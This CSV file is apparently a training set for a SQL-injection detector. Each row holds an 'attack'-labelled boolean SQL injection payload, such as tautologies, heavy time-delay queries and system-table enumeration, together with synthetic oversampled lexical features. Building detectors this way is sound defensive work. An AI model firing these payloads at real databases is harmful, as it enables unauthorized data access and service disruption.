id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000237,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.675568216880435,63.09791296933412,24.159443458489097,3.7693732397125306,14.539860864622277,19.159443458489097,21.239165187733647,8.159443458489093,0.23281079635936297,0.3041830830488884,0.3356861433447627,0.12731997724698588,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.0797217292445485,0.0,0.5398608646222741,0.5398608646222742,4.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.9248792163556234,129.0,29.0,4.025598880274295,70.11946960428705,6.922216925413252,37.22775923894638,14.730554231353311,0.5435617798781942,0.053660596321032955,0.288587280922065,0.11419034287870786,0.0,0.8083373059400614,1.4611084627066258,0.0,1.0,0.7305542313533129,0.0,5.191662694059939,0.0,0.0,2.269445768646687,3.1916626940599384,0.0,0.2694457686466872,0.7305542313533129,0.0,3.469446951953614e-18,0.7305542313533129,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000239,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.1857042743770598,141.0741993483658,29.79012725298078,3.9696975380570576,72.69139978278861,8.0,42.06178154173095,18.321018023846257,0.5172010703128835,0.057309424513106555,0.29681578716214563,0.12867371801186428,0.0,3.3703817589423455,0.0,0.0,1.0,1.790127252980782,0.0,5.580254505961563,1.5802545059615638,0.0,2.0,2.7901272529807817,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.5802545059615638,0.20987274701921804,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.790127252980782
SMOTE_000240,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,2.1130210591938026,126.35005284761286,35.96364917517887,3.8727289553994657,38.93638605656303,18.963649175178876,49.46819302828152,18.981824587589436,0.3061538954290096,0.14849018541357173,0.39462166574194374,0.15073425341547486,3.9909122937947186,0.0,2.0,1.0,0.0,1.4954561468973593,0.0,9.0,0.0,0.0,1.0,4.990912293794718,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.4954561468973593,0.0,0.4954561468973593,0.0,0.5045438531026407,0.4954561468973593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9909122937947186
SMOTE_000241,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.6383460848404732,150.72637604764975,30.38928075921224,3.7905962226470518,44.167842277636716,18.222849214739583,58.66854764421875,29.667136911054687,0.29325285978262544,0.1202414206521237,0.38784434038032845,0.19866137918492238,1.111424607369792,2.888575392630208,0.0,0.0,0.0,2.0,0.0,11.667136911054687,2.0,1.722143848157552,1.5557123036848959,8.0,0.27785615184244794,0.7221438481575521,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.7221438481575522,0.27785615184244794,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.3892807592122398,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3892807592122396
SMOTE_000242,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.3061408182142519,160.0,35.600584623703256,4.236486727842463,77.66715385308605,18.0,41.46598460567954,22.866861541234417,0.48541971158178776,0.1125,0.25916240378549704,0.1429178846327151,2.800292311851627,0.06656922938279097,2.0,0.0,1.0,2.0,0.0,5.066569229382791,0.0,5.0,4.0,5.933430770617209,0.9334307706172089,0.06656922938279097,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.9334307706172091,0.0,1.0,1.0,0.933430770617209,0.06656922938279097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.933430770617209
SMOTE_000243,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.20508920221730942,388.9565234102805,31.0,3.3047006455510926,94.10434765897196,58.0,183.9565234102805,52.895652341028054,0.2419874039253825,0.14913736411783599,0.4728765578593728,0.13599867409740868,0.0,0.0,1.1043476589719508,0.0,0.0,3.0,0.0,37.791304682056094,0.0,0.0,1.0,14.10434765897195,0.0,0.0,0.052173829485975376,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.052173829485975376,0.0,0.9478261705140245,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000244,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.0031373692554531513,273.9541978053908,37.99770989026954,3.8048420025512057,82.98740439648246,34.99083956107815,111.97938901242584,43.99656483540431,0.30292517291766113,0.12772308186017123,0.4087510517686836,0.1606006934534841,0.0,0.0,2.0,0.0,0.0,1.998854945134769,0.0,23.997709890269537,0.0,2.0,4.0,13.99885494513477,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.998854945134769,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.998854945134768
SMOTE_000245,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.07814755922657059,254.5647140168782,36.97927209604182,3.8084993019807367,75.91708838416727,36.7927209604182,99.87563257625092,41.97927209604182,0.29823930405027504,0.14448214222024713,0.3923548668553069,0.16492368687417092,0.0,0.0,2.0,0.0,0.0,1.9792720960418198,0.0,22.0,0.0,2.0,4.0,13.97927209604182,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.9792720960418198,0.0,0.02072790395818014,0.9792720960418198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.97927209604182
SMOTE_000246,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.1542645667951646,116.2024847069766,29.09619877655813,4.0927000286561785,64.76959021246503,7.8076024468837435,31.38479510623251,12.24049694139532,0.5572387486451538,0.06759344122582718,0.26999841063978036,0.10516939948923867,0.0,1.0961987765581283,0.0,0.0,1.0,0.9999999999999999,0.0,4.048099388279065,0.0,0.0,2.048099388279064,2.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.04809938827906424,0.9519006117209359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000247,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,0.12468875434293783,137.57682646071203,37.837240946427706,3.954533589684828,43.03255181071446,22.739585514284325,53.837240946427706,17.96744818928554,0.3129094847575639,0.16514758216665856,0.3913269925639753,0.1306159405118022,3.0,0.0,2.0,1.0,0.0,1.9674481892855409,0.0,9.0,0.0,0.0,1.0,4.967448189285541,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.9674481892855409,0.0,0.9674481892855407,0.03255181071445923,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.967448189285541
SMOTE_000248,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.8603907821349575,137.79857529825205,30.955238955167122,4.007218916484471,67.93285843275069,8.488809738791781,43.93285843275068,17.444048693958905,0.49366826680580367,0.06162884849011882,0.3187574302903815,0.12594545441369603,0.4888097387917807,0.0,2.0,0.0,1.0,0.9999999999999999,0.0,6.4888097387917805,0.4888097387917809,0.0,2.488809738791781,4.0,0.48880973879178075,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.5111902612082192,0.48880973879178086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000249,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.398933082257144,61.754277827668275,21.782854185375605,3.6391015125806927,10.719997699736581,22.12571297127805,20.251425942556097,8.65714121409756,0.16885656765261797,0.36596991306660853,0.3277191573784054,0.1374543619023681,0.0,0.5314282428195118,3.0,0.0,0.0,2.0,0.0,2.062856485639024,0.0,0.5314282428195118,0.5314282428195121,5.0,0.0,0.5314282428195117,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.0747254208951271,212.3841680359355,36.26298400347763,3.8315077788679015,64.05193601391052,30.034624009273678,84.29760801275131,34.0,0.3012190155039114,0.1409168808294919,0.3970911770966546,0.1607729265699421,2.4913439976815805,0.0,0.0,0.0,0.0,2.0,0.0,17.50865600231842,0.49134399768158066,1.0,3.0,9.50865600231842,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.7543280011592097,0.0,0.7543280011592097,0.0,0.24567199884079044,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.75432800115921
SMOTE_000251,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.42227344911722425,273.3730148283497,38.0,3.804450695841411,82.87460296566995,35.2507940686601,111.2476177940197,44.0,0.3031595932738249,0.12896727614876166,0.406914899937403,0.16095823064001047,0.12539703433005123,0.0,2.0,0.0,0.0,2.0,0.0,23.874602965669947,0.0,2.0,4.0,14.0,0.12539703433005112,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.8746029656699489,0.12539703433005112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000252,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,2.1738683315368474,229.18816794726533,34.51085584311146,3.741215799454176,69.09408397363266,28.007237228740976,92.0578978299278,40.0289489149639,0.29888074261760983,0.1232954433083793,0.4028966898851551,0.17492712418885578,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.014474457481946,0.9927627712590261,1.5036186143704868,3.5036186143704873,10.014474457481947,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.4963813856295132,0.5036186143704869,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.007237228740974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.007237228740975
SMOTE_000253,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.3797462555609806,248.31900744459932,36.607000437917605,3.8035619730382453,73.51100277347818,36.73800029194507,97.38000291945072,40.69000145972535,0.2955990223269394,0.14856568241053092,0.39215686274509803,0.16367843251743164,0.0,0.13099985402746417,2.0,0.0,0.0,2.0,0.0,21.345000729862683,0.0,1.8690001459725356,3.869000145972536,13.476000583890144,0.0,0.1309998540274641,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.738000291945072,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.738000291945072
SMOTE_000254,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,1.1754313381307409,33.89090385117393,14.0,2.9087499609484118,6.287276919060851,3.2472653916435057,15.06908462140872,9.287276919060853,0.1883921940755906,0.09200793478619447,0.44242993507978684,0.2771699360584281,0.0,4.109096148826066,2.0,0.0,0.0,0.9999999999999999,0.0,2.1781807702347873,0.0,0.0,0.0,3.0,0.0,0.8218192297652133,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.17818077023478673,0.8218192297652133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000255,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.2004638658278028,77.04320632519176,28.739056270506843,3.967255009842849,23.521603162595877,16.173962486328772,25.652075027342455,11.695565648924651,0.304406615127719,0.21173941683392306,0.3328155878383072,0.15103838020005075,0.0,3.8695281352534217,1.0,0.0,0.0,1.0434906215821926,0.0,3.8695281352534225,0.0,0.9565093784178073,0.9565093784178073,2.043490621582193,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.043490621582192746,0.0,0.9565093784178073,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.08600481006493,360.15491845067737,30.384682403167336,3.3594451397907727,87.38555364434268,58.0,164.38468240316735,50.38468240316733,0.24234068313591212,0.16111631340556354,0.456609947662316,0.13993305579620835,0.6153175968326657,0.0,3.0,0.0,0.0,2.3846824031673344,0.0,34.0,0.0,0.0,0.3846824031673344,15.384682403167336,0.6153175968326657,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.3846824031673344,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3846824031673343,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.769364806334668
SMOTE_000257,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.3318112394901152,39.18731631710108,12.406341841449457,2.5890185256976856,2.4063418414494606,10.780974475651629,20.0,6.0,0.06176252698932638,0.2743363047505606,0.5106932063539331,0.1532079619061799,1.0,0.0,0.5936581585505428,0.0,0.0,0.9999999999999999,0.0,3.0,0.4063418414494572,0.0,0.0,1.593658158550542,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.4063418414494573,0.5936581585505428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000258,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,2.0344619175799883,363.9971628381223,30.624822677382642,3.383521727842046,90.74751748335697,58.0,164.62482267738264,50.62482267738264,0.24902163564194796,0.1594149072788892,0.45244810293435184,0.139115354144811,0.3751773226173589,0.0,3.0,0.0,0.0,2.6248226773826415,0.0,34.0,0.0,0.0,0.6248226773826413,15.624822677382642,0.37517732261735875,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.624822677382641,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6248226773826413,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.24964535476528
SMOTE_000259,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.3319867950592433,157.08252908029365,34.24758724088097,4.1636413754149135,75.08252908029365,16.0,49.0,17.0,0.4779798187770733,0.10185759633618083,0.3119388887795538,0.10822369610719212,0.9174709197063445,0.08252908029365558,2.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,0.9174709197063444,0.08252908029365547,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.08252908029365558,0.9174709197063445,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000260,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.06721046265946001,149.9034847018594,33.11293558773242,4.124284277398611,75.88706441226758,16.0,41.9034847018594,16.112935587732423,0.506412506309005,0.10676459816057152,0.2793389624161422,0.10748393311428123,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.112935587732425,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000261,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.1371436962136143,194.93096466693078,33.576359666647804,3.7337370841081525,55.423640333352196,25.2709210000566,79.3891226668176,34.8472806667044,0.28459001137233486,0.12953478033216978,0.40706312376109116,0.17881208453440417,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.8472806667044,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.4236403333521994,0.5763596666478006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000262,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.012348649554748722,149.04186720146564,33.006280080219845,4.343351118584481,85.98325311941375,9.01884024065953,37.02093360073281,17.018840240659532,0.5769391261453718,0.06049920142349709,0.24838449704360277,0.11417717538752847,4.0,0.0,0.0,0.0,1.0,1.0020933600732813,0.0,4.0041867201465635,0.0,0.010466800366406237,3.0020933600732813,2.010466800366407,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.002093360073281203,1.0020933600732813,0.0,0.0020933600732813695,1.0,1.0,0.9979066399267187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.002093360073282
